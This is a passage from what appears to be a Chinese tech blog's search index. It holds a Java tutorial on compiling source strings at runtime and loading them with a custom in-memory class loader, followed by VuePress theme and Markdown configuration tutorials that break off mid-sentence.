compiler.getTask(null, manager, null, options, null, Arrays.asList(javaFileObject)); if (task.call()) { return manager.getClassBytes(); } } catch (IOException e) { e.printStackTrace(); } return null; } /** * 先根据类名在内存中查找是否已存在该类，若不存在则调用URLClassLoader.defineClass()方法加载该类 * URLClassLoader的具体作用就是将Class文件加载到JVM虚拟机中 */ public static class MemoryClassLoader extends URLClassLoader { private Map&lt;String, byte[]&gt; classBytes = new HashMap&lt;String, byte[]&gt;(); public MemoryClassLoader(Map&lt;String, byte[]&gt; classBytes) { super(new URL[0], MemoryClassLoader.class.getClassLoader()); this.classBytes.putAll(classBytes); } @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException { byte[] buf = this.classBytes.get(name); if (buf == null) { return super.findClass(name); } this.classBytes.remove(name); return defineClass(name, buf, 0, buf.length); } }} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132package com.clay.loader;import javax.tools.*;import java.io.*;import java.net.URI;import java.nio.CharBuffer;import java.util.HashMap;import java.util.Map;/** * 将编译好的Class文件保存到内存当中，这里的内存也就是Map映射当中 * * @author clay */public final class MemoryJavaFileManager extends ForwardingJavaFileManager { /** * 用于存放Class文件的内存 */ private Map&lt;String, byte[]&gt; classBytes; /** * Java源文件的扩展名 */ private final static String EXT = ".java"; public MemoryJavaFileManager(JavaFileManager fileManager) { super(fileManager); classBytes = new HashMap&lt;String, byte[]&gt;(); } public Map&lt;String, byte[]&gt; getClassBytes() { return classBytes; } @Override public void close() throws IOException { classBytes = new HashMap&lt;String, byte[]&gt;(); } @Override public void flush() throws IOException { } @Override public JavaFileObject getJavaFileForOutput( JavaFileManager.Location location, String className, JavaFileObject.Kind kind, FileObject sibling) throws IOException { if (kind == JavaFileObject.Kind.CLASS) { return new ClassOutputBuffer(className); } else { return super.getJavaFileForOutput(location, className, kind, sibling); } } public JavaFileObject makeStringSource(String name, String code) { return new StringInputBuffer(name, code); } public static URI toURI(String name) { File file = new File(name); if (file.exists()) { return file.toURI(); } else { try { final StringBuilder newUri = new StringBuilder(); newUri.append("mfm:///"); newUri.append(name.replace(\'.\', \'/\')); if (name.endsWith(EXT)) { newUri.replace(newUri.length() - EXT.length(), newUri.length(), EXT); } return URI.create(newUri.toString()); } catch (Exception exp) { return URI.create("mfm:///com/sun/script/java/java_source"); } } } /** * 一个文件对象，用来表示从String中获取到的Source，以下内容是按照JDK给出的例子写的 */ private static class StringInputBuffer extends SimpleJavaFileObject { private final String code; /** * @param name 此文件对象表示的编译单元的name * @param code 此文件对象表示的编译单元source的code */ StringInputBuffer(String name, String code) { super(toURI(name), Kind.SOURCE); this.code = code; } @Override public CharBuffer getCharContent(boolean ignoreEncodingErrors) { return CharBuffer.wrap(code); } public Reader openReader() { return new StringReader(code); } } /** * 将Java字节码存储到classBytes映射中的文件对象 */ private class ClassOutputBuffer extends SimpleJavaFileObject { private String name; ClassOutputBuffer(String name) { super(toURI(name), Kind.CLASS); this.name = name; } @Override public OutputStream openOutputStream() { return new FilterOutputStream(new ByteArrayOutputStream()) { @Override public void close() throws IOException { out.close(); ByteArrayOutputStream bos = (ByteArrayOutputStream) out; // 这里可能需要修改 classBytes.put(name, bos.toByteArray()); } }; } }} 编写测试类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.clay.loader;import com.clay.domain.Store;import com.clay.domain.Supermarket;import org.springframework.util.Assert;import java.lang.reflect.Constructor;import java.util.Map;/** * @author clay */public class ProxyUtil { /** * 获取Java代码 * * @return */ public String getJavaCode() { String rt = "\\r\\n"; // 这里定义的Java类代码里，建议首行不要带包名，否则容易出现编译失败的问题 String code = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"invoke dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; return code; } /** * 动态编译 * * @throws Exception */ public void handle() throws Exception { String javaName = "Dealer.java"; // 对Java代码进行编译，并将生成Class文件存放在Map中 DynamicLoader dynamicLoader = new DynamicLoader(); Map&lt;String, byte[]&gt; bytecode = dynamicLoader.compile(javaName, getJavaCode()); // 加载字节码到虚拟机中 DynamicLoader.MemoryClassLoader classLoader = new DynamicLoader.MemoryClassLoader(bytecode); Class&lt;?&gt; clazz = classLoader.loadClass("Dealer"); Assert.notNull(clazz, ""); // 通过反射进行调用 Constructor constructor = clazz.getConstructor(Store.class); Store store = (Store) constructor.newInstance(new Supermarket()); store.sell(); }} 123456789101112131415161718192021222324package com.clay;import com.clay.loader.ProxyUtil;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @author clay */@SpringBootApplicationpublic class ProxyApplication { public static void main(String[] args) { SpringApplication.run(ProxyApplication.class, args); try { ProxyUtil util = new ProxyUtil(); util.handle(); } catch (Exception e) { e.printStackTrace(); } }} 程序运行结果12invoke dealer sell methodinvoke supermarket sell method 常见问题动态编译时找不到第三方包的类动态编译 Java 文件时，如果这个 Java 文件引用了第三方 Jar 包里的类，那么程序运行在 IDE 工具时，则可以正常动态编译。如果程序单独运行在 Web 容器（例如 Tomcat），又或者是直接通过 java -jar xxx.jar 的命令行方式运行，那么执行动态编译时，往往就会提示找不到第三方 Jar 包里的 Class 或者 Package，导致无法正常编译生成 Class 文件或者字节码。 解决方案： 方法一：将所依赖到的第三方 Jar 文件，复制到 %JAVA_HOME%\\jre\\lib\\ext 目录下，然后再重启 Web 容器（Tomcat）或者应用，此方法不一定兼容所有 JDK 版本，且未经验证是否有效 方法二：执行动态编译时，添加 -classpath 参数来指定第三方 Jar 包的绝对路径，示例代码如下： 12345678String jars = "/root/.m2/repository/com/clay/proxy/1.0.0/proxy-1.0.0.jar";Iterable&lt;String&gt; options = Arrays.asList("-encoding", "UTF-8", "-classpath", jars);JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null);Iterable units = fileMgr.getJavaFileObjects(fileName);JavaCompiler.CompilationTask task = compiler.getTask(null, fileMgr, null, options, null, units);result = task.call(); SpringBoot 找不到动态编译后的类在 SpringBoot 应用内执行动态编译时，可以正常生成 Class 文件，但往往无法直接通过 URLClassLoader 类加载 Class 文件来实例化 Java 对象，示例代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaCompiler.CompilationTask;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Constructor;import java.net.URL;import java.net.URLClassLoader;public class ProxyUtil { /** * 生成文件 * * @param path * @return content */ public boolean createFile(String path, String content) { FileWriter fw = null; try { String parentPath = path.substring(0, path.lastIndexOf("/")); File parentFile = new File(parentPath); if (!parentFile.exists()) { parentFile.mkdirs(); } File javaFile = new File(path); if (!javaFile.exists()) { javaFile.createNewFile(); } fw = new FileWriter(javaFile); fw.write(content); fw.flush(); return true; } catch (Exception e) { e.printStackTrace(); } finally { if (fw != null) { try { fw.close(); } catch (IOException e) { e.printStackTrace(); } } } return false; } /** * 动态编译 * * @throws Exception */ public void handle() throws Exception { String rt = "\\r\\n"; String outputDir = "/tmp/jdk/compile/"; // 这里定义的Java类代码里，建议首行不要带包名，否则容易出现编译失败的问题 String source = "import com.clay.domain.Store;" + rt + "public class Dealer implements Store" + rt + "{" + rt + "private Store s;" + rt + "public Dealer(Store s)" + rt + " {" + " this.s = s;" + rt + " }" + rt + "@Override" + rt + "public void sell()" + " {" + rt + "System.out.println(\\"call dealer sell method\\");" + rt + "s.sell();" + rt + " }" + rt + "}"; // Java文件的完整路径 String javaPath = outputDir + "Dealer.java"; System.out.println("===&gt; java file path: " + javaPath); // 生成Java文件 createFile(javaPath, source); // 编译Java文件 JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager fileMgr = compiler.getStandardFileManager(null, null, null); Iterable units = fileMgr.getJavaFileObjects(javaPath); CompilationTask task = compiler.getTask(null, fileMgr, null, null, null, units); boolean result = task.call(); fileMgr.close(); System.out.println("===&gt; compile result: " + result); String classPath = "file:/" + outputDir; System.out.println("===&gt; class file path: " + classPath); // 加载Class文件 URL[] urls = new URL[]{new URL(classPath)}; URLClassLoader ul = new URLClassLoader(urls); Class clazz = ul.loadClass("Dealer"); // 实例化 Constructor ctr = clazz.getConstructor(Store.class); Store s = (Store) ctr.newInstance(new Supermarket()); s.sell(); }} 特别注意：在 SpringBoot 应用内无法正常运行上述代码，即调用 loadClass () 方法的时候会抛出异常 “java.lang.ClassNotFoundException: Dealer” 此时可以尝试使用 Thread.currentThread().getContextClassLoader() 来替代 new URLClassLoader(urls)，具体的实现代码可参考开源项目 dynamic-loader，这里不再累述 开源项目 varcode dynamic-java-compiler dynamic-loader（推荐） 参考博客 动态代理 - 动态生成 Java 文件并编译成 Class 文件 Java 引入 import 其它目录的自定义包或 Java 源文件 将 Java 字符串形式的源代码动态编译，生成 Class 文件并执行 Java 动态编译整个项目，解决 Jar 包找不到的问题 Java Web 项目部署后，动态编译无法找到依赖的 Jar 包 Java Web 项目部署到 Tomcat 后，使用动态编译无法找到相关类的解决方案 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"VuePress 入门教程之四插件篇",url:"/posts/9e89901e.html",text:'前言VuePress 上篇 VuePress 入门教程之三主题篇 VuePress 站点 VuePress 插件介绍 VuePress 官方文档 VuePress 中文文档 VuePress Github 项目 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"VuePress 入门教程之三主题篇",url:"/posts/cf4f7150.html",text:"前言VuePress 上篇 VuePress 入门教程之二 Markdown 篇 VuePress 站点 Vuepress 主题介绍 VuePress 官方文档 VuePress 中文文档 VuePress Github 项目 使用主题使用一个主题和使用一个插件的方式几乎一致。 使用来自依赖的主题一个主题可以在以 vuepress-theme-xxx 的形式发布到 NPM，你可以这样使用它： 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xx'} 主题的缩写如果你的主题名以 vuepress-theme- 开头，你可以使用缩写来省略这个前缀： 1234// .vuepress/config.jsmodule.exports = { theme: 'xxx'} 和下面等价： 1234// .vuepress/config.jsmodule.exports = { theme: 'vuepress-theme-xxx'} 这也适用于 Scoped Packages: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/vuepress-theme-xxx', // 或者一个官方主题: '@vuepress/theme-xxx'} 缩写: 1234// .vuepress/config.jsmodule.exports = { theme: '@org/xxx', // 或者一个官方主题: '@vuepress/xxx'} 提示：以 @vuepress/theme- 开头的主题是官方维护的主题 主题的通用配置和插件几乎一样，主题的配置文件 themeEntry 应该导出一个普通的 JavaScript 对象（#1），它也可以是一个返回对象的函数（#2），这个函数接受用户在 siteConfig.themeConfig 为第一个参数、包含编译期上下文的 ctx 对象作为第二个参数。 12345// .vuepress/theme/index.js// #1module.exports = { // ...} 1234567// .vuepress/theme/index.js// #2module.exports = (themeConfig, ctx) =&gt; { return { // ... }} 提示： 你应该能看到 themeEntry 和 themeConfig 的区别，前者是一个主题本身的配置，这些配置由 VuePress 本身提供；而后者则是用户对主题的配置，这些配置选项则由当前使用的主题来实现，如 默认主题配置。 除了本节列出的选项，themeEntry 也支持插件支持的所有 配置选项 和 生命周期。 plugins 类型: Array|Object 默认值: undefined 参考: 插件 &gt; 使用插件 Warning 注意：你一般可能不需要使用下面的这些配置选项，除非你知道你在做什么！ devTemplate 类型: String 默认值: undefined dev 模式下使用的 HTML 模板路径，默认模板见 这里。 ssrTemplate 类型: String 默认值: undefined build 模式下使用的 HTML 模板路径，默认模板见 这里。 参考: Vue SSR Guide &gt; template. extend 类型: String 默认值: undefined 1234// .vuepress/theme/index.jsmodule.exports = { extend: '@vuepress/theme-default'} VuePress 支持一个主题继承于另一个主题。VuePress 将遵循 override 的理念自动帮你解决各种主题属性（如样式、布局组件）的优先级。 参考: 主题继承 例子: @vuepress/theme-vue globalLayout 类型: String 默认值: undefined 1234// .vuepress/theme/index.jsmodule.exports = { globalLayout: '/path/to/your/global/vue/sfc'} 全局布局组件是负责管理全局布局方案的一个组件，VuePress 默认的 globalLayout 会帮你根据 $frontmatter.layout 来渲染不同的布局，所以大部分情况下你不要配置此选项。举例来说，当你想为当前主题设置全局的 header 和 footer 时，你可以这样做： 12345678910111213141516171819202122232425&lt;!-- .vuepress/theme/layouts/GlobalLayout.vue --&gt;&lt;template&gt; &lt;div id=\"global-layout\"&gt; &lt;header&gt;&lt;h1&gt;Header&lt;/h1&gt;&lt;/header&gt; &lt;component :is=\"layout\"/&gt; &lt;footer&gt;&lt;h1&gt;Footer&lt;/h1&gt;&lt;/footer&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { computed: { layout () { if (this.$page.path) { if (this.$frontmatter.layout) { // 你也可以像默认的 globalLayout 一样首先检测 layout 是否存在 return this.$frontmatter.layout } return 'Layout' } return 'NotFound' } }}&lt;/script&gt; 默认主题的配置下述所列的选项仅对 VuePress 的默认主题生效，如果你在使用一个自定义主题，选项可能会有不同。 首页默认的主题提供了一个首页（Homepage）的布局 (用于 这个网站的主页)。想要使用它，需要在你的根级 README.md 的 YAML Front Matter 指定 home: true。以下是一个如何使用的例子： 12345678910111213141516---home: trueheroImage: /hero.pngheroText: Hero 标题tagline: Hero 副标题actionText: 快速上手 →actionLink: /zh/guide/features:- title: 简洁至上 details: 以 Markdown 为中心的项目结构，以最少的配置帮助你专注于写作。- title: Vue驱动 details: 享受 Vue + webpack 的开发体验，在 Markdown 中使用 Vue 组件，同时可以使用 Vue 来开发自定义主题。- title: 高性能 details: VuePress 为每个页面预渲染生成静态的 HTML，同时在页面被加载的时候，将作为 SPA 运行。footer: MIT Licensed | Copyright © 2018-present Evan You--- 你可以将相应的内容设置为 null 来禁用标题和副标题，任何 YAML Front Matter 之后额外的内容将会以普通的 Markdown 被渲染，并插入到 features 的后面。 导航栏导航栏可能包含你的页面标题、多语言切换、搜索框、 导航栏链接、仓库链接，它们均取决于你的配置。 导航栏 Logo你可以通过 themeConfig.logo 增加导航栏 Logo ，Logo 可以被放置在公共文件目录： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { logo: '/assets/img/logo.png', }} 导航栏链接你可以通过 themeConfig.nav 增加一些导航栏链接: 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Home', link: '/' }, { text: 'Guide', link: '/guide/' }, { text: 'External', link: 'https://google.com' }, ] }} 外部链接 &lt;a&gt; 标签的特性将默认包含 target=\"_blank\" rel=\"noopener noreferrer\"，你可以提供 target 与 rel，它们将被作为特性被增加到 &lt;a&gt; 标签上： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'External', link: 'https://google.com', target:'_self', rel:'' }, { text: 'Guide', link: '/guide/', target:'_blank' } ] }} 当你提供了一个 items 数组而不是一个单一的 link 时，它将显示为一个 下拉列表 ： 123456789101112131415// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', ariaLabel: 'Language Menu', items: [ { text: 'Chinese', link: '/language/chinese/' }, { text: 'Japanese', link: '/language/japanese/' } ] } ] }} 此外，你还可以通过嵌套的 items 来在 下拉列表 中设置分组： 1234567891011121314// .vuepress/config.jsmodule.exports = { themeConfig: { nav: [ { text: 'Languages', items: [ { text: 'Group1', items: [/* */] }, { text: 'Group2', items: [/* */] } ] } ] }} 禁用导航栏你可以使用 themeConfig.navbar 来禁用所有页面的导航栏： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { navbar: false }} 你也可以通过 YAML Front Matter 来禁用某个指定页面的导航栏： 123---navbar: false--- 侧边栏想要使 侧边栏（Sidebar）生效，需要配置 themeConfig.sidebar，基本的配置，需要一个包含了多个链接的数组： 12345678910// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ '/', '/page-a', ['/page-b', 'Explicit link text'] ] }} 你可以省略 .md 拓展名，同时以 / 结尾的路径将会被视为 */README.md，这个链接的文字将会被自动获取到（无论你是声明为页面的第一个 header，还是明确地在 YAML Front Matter 中指定页面的标题）。如果你想要显示地指定链接的文字，使用一个格式为 [link, text] 的数组。 嵌套的标题链接默认情况下，侧边栏会自动地显示由当前页面的标题（headers）组成的链接，并按照页面本身的结构进行嵌套，你可以通过 themeConfig.sidebarDepth 来修改它的行为。默认的深度是 1，它将提取到 h2 的标题，设置成 0 将会禁用标题（headers）链接，同时，最大的深度为 2，它将同时提取 h2 和 h3 标题。 也可以使用 YAML Front Matter 来为某个页面重写此值（优先级最高）： 123---sidebarDepth: 2--- 显示所有页面的标题链接默认情况下，侧边栏只会显示由当前活动页面的标题（headers）组成的链接，你可以将 themeConfig.displayAllHeaders 设置为 true 来显示所有页面的标题链接： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { displayAllHeaders: true // 默认值：false }} 活动的标题链接默认情况下，当用户通过滚动查看页面的不同部分时，嵌套的标题链接和 URL 中的 Hash 值会实时更新，这个行为可以通过以下的配置来禁用： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { activeHeaderLinks: false, // 默认值：true }} 值得一提的是，当你禁用此选项时，此功能的相应脚本将不会被加载，这是我们性能优化的一个小点 侧边栏分组你可以通过使用对象来将侧边栏划分成多个组： 123456789101112131415161718192021// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: [ { title: 'Group 1', // 必要的 path: '/foo/', // 可选的, 标题的跳转链接，应为绝对路径且必须存在 collapsable: false, // 可选的, 默认值是 true, sidebarDepth: 1, // 可选的, 默认值是 1 children: [ '/' ] }, { title: 'Group 2', children: [ /* ... */ ], initialOpenGroupIndex: -1 // 可选的, 默认值是 0 } ] }} 侧边栏的每个子组默认是可折叠的，你可以设置 collapsable: false 来让一个组永远都是展开状态。一个侧边栏的子组配置同时支持 sidebarDepth 字段用于重写默认显示的侧边栏深度 (1)。 嵌套的侧边栏分组也是支持的 多个侧边栏如果你想为不同的页面组来显示不同的侧边栏，首先，将你的页面文件组织成下述的目录结构： 123456789101112.├─ README.md├─ contact.md├─ about.md├─ foo/│&nbsp;&nbsp;├─ README.md│ ├─ one.md│ └─ two.md└─ bar/ ├─ README.md ├─ three.md └─ four.md 接着，遵循以下的侧边栏配置： 12345678910111213141516171819202122232425// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: { '/foo/': [ '', /* /foo/ */ 'one', /* /foo/one.html */ 'two' /* /foo/two.html */ ], '/bar/': [ '', /* /bar/ */ 'three', /* /bar/three.html */ 'four' /* /bar/four.html */ ], // fallback '/': [ '', /* / */ 'contact', /* /contact.html */ 'about' /* /about.html */ ] } }} 注意：确保 fallback 侧边栏被最后定义，VuePress 会按顺序遍历侧边栏配置来寻找匹配的配置 自动生成侧栏如果你希望自动生成一个仅仅包含了当前页面标题（headers）链接的侧边栏，你可以通过 YAML Front Matter 来实现（优先级最高）： 123---sidebar: auto--- 你也可以通过配置来在所有页面中启用它： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: 'auto' }} 在 多语言 模式下，你也可以将其应用到某一特定的语言下： 12345678// .vuepress/config.jsmodule.exports = { themeConfig: { '/zh/': { sidebar: 'auto' } }} 注意：自动生成的侧边栏，默认支持多级显示（两级以上） 禁用侧边栏你可以通过 YAML Front Matter 来禁用指定页面的侧边栏： 123---sidebar: false--- 搜索框内置搜索你可以通过设置 themeConfig.search: false 来禁用默认的搜索框，或是通过 themeConfig.searchMaxSuggestions 来调整默认搜索框显示的搜索结果数量： 1234567// .vuepress/config.jsmodule.exports = { themeConfig: { search: false, searchMaxSuggestions: 10 }} 你可以通过在页面的 Front Matter 中设置 tags 来优化搜索结果： 123456---tags: - 配置 - 主题 - 索引--- 你可以通过在页面的 Front Matter 中设置 search 来对单独的页面禁用内置的搜索框： 123---search: false--- 提示： 如果你需要全文搜索，你可以使用 Algolia 搜索 内置搜索只会为页面的标题、h2 、 h3 以及 tags 构建搜索索引 Algolia 搜索如果需要全文搜索，你可以通过 themeConfig.algolia 选项来使用 Algolia 搜索 替换内置的搜索框。要启用 Algolia 搜索，你需要至少提供 apiKey 和 indexName： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { algolia: { apiKey: '&lt;API_KEY&gt;', indexName: '&lt;INDEX_NAME&gt;' } }} 不同于开箱即用的 内置搜索，Algolia 搜索 需要你在使用之前将你的网站提交给它们用于创建索引，更多选项请参考 Algolia DocSearch 的官方文档。 最后更新时间你可以通过 themeConfig.lastUpdated 选项来获取每个文件最后一次 git 提交的 UNIX 时间戳（ms），同时它将以合适的日期格式显示在每一页的底部： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { lastUpdated: 'Last Updated', // string | boolean }} 请注意，themeConfig.lastUpdated 默认是关闭的，如果给定一个字符串，它将会作为前缀显示（默认值是：Last Updated）。由于 lastUpdated 是基于 git 的，所以你只能在一个基于 git 的项目中启用它。此外，由于使用的时间戳来自 git commit，因此它将仅在给定页的第一次提交之后显示，并且仅在该页面后续提交更改时更新。 参考: @vuepress/plugin-last-updated 上 / 下一篇链接上一篇和下一篇文章的链接将会自动地根据当前页面的侧边栏的顺序来获取。 你可以通过 themeConfig.nextLinks 和 themeConfig.prevLinks 来全局禁用它们： 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { // 默认值是 true 。设置为 false 来禁用所有页面的 下一篇 链接 nextLinks: false, // 默认值是 true 。设置为 false 来禁用所有页面的 上一篇 链接 prevLinks: false }} 你也可以使用 YAML Front Matter 来明确地重写或者禁用它们： 1234---prev: ./some-other-pagenext: false--- Git 仓库和编辑链接当你提供了 themeConfig.repo 选项，将会自动在每个页面的导航栏生成生成一个 GitHub 链接，以及在页面的底部生成一个 \"Edit this page\" 链接。 1234567891011121314151617181920212223// .vuepress/config.jsmodule.exports = { themeConfig: { // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'vuejs/vuepress', &nbsp; &nbsp;// 自定义仓库链接文字。默认从 `themeConfig.repo` 中自动推断为 &nbsp; &nbsp;// \"GitHub\"/\"GitLab\"/\"Bitbucket\" 其中之一，或是 \"Source\"。 &nbsp; &nbsp;repoLabel: '查看源码', &nbsp; &nbsp;// 以下为可选的编辑链接选项 &nbsp; &nbsp;// 假如你的文档仓库和项目本身不在一个仓库： &nbsp; &nbsp;docsRepo: 'vuejs/vuepress', &nbsp; &nbsp;// 假如文档不是放在仓库的根目录下： &nbsp; &nbsp;docsDir: 'docs', &nbsp; &nbsp;// 假如文档放在一个特定的分支下： &nbsp; &nbsp;docsBranch: 'master', // 默认是 false, 设置为 true 来启用 editLinks: true, // 默认为 \"Edit this page\" editLinkText: '帮助我们改善此页面！' }} 你可以通过 YAML front matter 来禁用指定页面的编辑链接： 123---editLink: false--- 页面滚动你可以通过 themeConfig.smoothScroll 选项来启用页面滚动效果： 123456// .vuepress/config.jsmodule.exports = { themeConfig: { smoothScroll: true }} 自定义页面类（CSS）有时候你可能需要为特定页面添加一个 CSS 类名，以方便针对该页面添加一些专门的 CSS。这种情况下你可以在该页面的 YAML Front Matter 中声明一个 pageClass： 123---pageClass: custom-page-class--- 只能在 .vuepress/styles/index.styl 中编写针对该页面的 CSS ： 12345/* .vuepress/styles/index.styl */.theme-container.custom-page-class { /* 特定页面的 CSS */} 自定义样式应该写在 index.styl 内，该文件可以让你方便地添加或覆盖样式 特定页面的自定义布局默认情况下，每个 *.md 文件将会被渲染在一个 &lt;div class=\"page\"&gt; 容器中，同时还有侧边栏、自动生成的编辑链接，以及上 / 下一篇文章的链接。如果你想要使用一个完全自定义的组件来代替当前的页面（而只保留导航栏），你可以再次使用 YAML Front Matter 来指定这个组件。 123---layout: SpecialLayout--- 这将会为当前的页面渲染 .vuepress/components/SpecialLayout.vue 布局。 下篇 - VuePress 入门教程之四 VuePress 入门教程之四插件篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客"},{title:"VuePress 入门教程之二 Markdown 篇",url:"/posts/b693c9f4.html",text:"前言VuePress 上篇 VuePress 入门教程之一快速入门篇 VuePress 站点 VuePress 官方文档 VuePress 中文文档 VuePress Github 项目 Markdown 扩展Header Anchors所有的标题将会自动地应用 anchor 链接，anchor 的渲染可以通过 markdown.anchor 来配置。 链接内部链接网站内部的链接，将会被转换成 &lt;router-link&gt; 用于 SPA 导航。同时，站内的每一个文件夹下的 README.md 或者 index.md 文件都会被自动编译为 index.html，对应的链接将被视为 /。 以如下的文件结构为例： 12345678910.├─ README.md├─ foo│&nbsp;&nbsp;├─ README.md│ ├─ one.md│ └─ two.md└─ bar ├─ README.md ├─ three.md └─ four.md 假设你现在位于 foo/one.md 中： 12345[Home](/) &lt;!-- 跳转到根部的 README.md --&gt;[foo](/foo/) &lt;!-- 跳转到 foo 文件夹的 index.html --&gt;[foo heading](./#heading) &lt;!-- 跳转到 foo/index.html 的特定标题位置 --&gt;[bar - three](../bar/three.md) &lt;!-- 具体文件可以使用 .md 结尾（推荐） --&gt;[bar - four](../bar/four.html) &lt;!-- 也可以用 .html --&gt; 链接的重定向VuePress 支持重定向到干净链接。如果一个链接 /foo 找不到，VuePress 会自行寻找一个可用的 /foo/ 或 /foo.html。反过来，当 /foo/ 或 /foo.html 中的一个找不到时，VuePress 也会尝试寻找另一个。借助这种特性，我们可以通过官方插件 vuepress-plugin-clean-urls 定制你的网站路径。 Tip 注意：无论是否使用了 permalink 和 clean-urls 插件，你的相对路径都应该依赖于当前的文件结构来定义。在上面的例子中，即使你将 /foo/one.md 的路径设为了 /foo/one/，你依然应该通过 ./two.md 来访问 /foo/two.md 页面后缀默认情况下，页面和内部链接是以 .html 后缀生成，可以通过设置 config.markdown.pageSuffix 来自定义它。 外部链接外部的链接将会被自动地设置为 target=\"_blank\" rel=\"noopener noreferrer\": 12- [vuejs.org](https://vuejs.org)- [VuePress on GitHub](https://github.com/vuejs/vuepress) 你可以自定义通过配置 config.markdown.externalLinks 来自定义外部链接的特性。 Front MatterVuePress 提供了对 YAML Front Matter 开箱即用的支持: 1234---title: Blogging Like a Hackerlang: en-US--- 这些数据可以在当前 Markdown 的正文，或者是任意的自定义或主题组件中使用。想了解更多，请移步 Front Matter。 Github 风格的表格输入内容 12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | 输出效果 Emoji 表情输入内容 1:tada: :100: 输出效果 你可以在这个列表找到所有可用的 Emoji 表情。 文档目录输入内容 1[[toc]] 输出效果 目录（Table of Contents）的渲染可以通过 markdown.toc 选项来配置。 自定义容器 Warning 注意：自定义容器只针对 VuePress 的默认主题有效。 输入内容 123456789101112131415::: tip这是一个提示:::::: warning这是一个警告:::::: danger这是一个危险警告:::::: details这是一个详情块，在 IE / Edge 中不生效::: 输出效果 代码块中的语法高亮VuePress 使用了 Prism 来为 Markdown 中的代码块实现语法高亮。Prism 支持大量的编程语言，你需要做的只是在代码块的开始倒勾中附加一个有效的语言别名： 输入内容 12345678910``` html&lt;ul&gt; &lt;li v-for=\"todo in todos\" :key=\"todo.id\" &gt; {{ todo.text }} &lt;/li&gt;&lt;/ul&gt;``` 输出效果 在 Prism 的网站上查看 合法的语言列表。 代码块中的行高亮输入内容 123456789``` js {4}export default { data () { return { msg: 'Highlighted!' } }}``` 输出效果 除了单行以外，你也可指定多行，行数区间，或是两者都指定。 行数区间：例如 {5-8}, {3-10}, {10-17} 多个单行：例如 {4,7,9} 行数区间与多个单行：例如 {4,7-13,16,23-27,40} 输入内容 12345678910111213``` js{1,4,6-7}export default { // Highlighted data () { return { msg: `Highlighted! This line isn't highlighted, but this and the next 2 are.`, motd: 'VuePress is awesome', lorem: 'ipsum', } }}``` 输出效果 代码块行号显示你可以通过配置来为每个代码块显示行号： 12345module.exports = { markdown: { lineNumbers: true }} 显示效果： 代码块片段导入你可以通过下述的语法，在 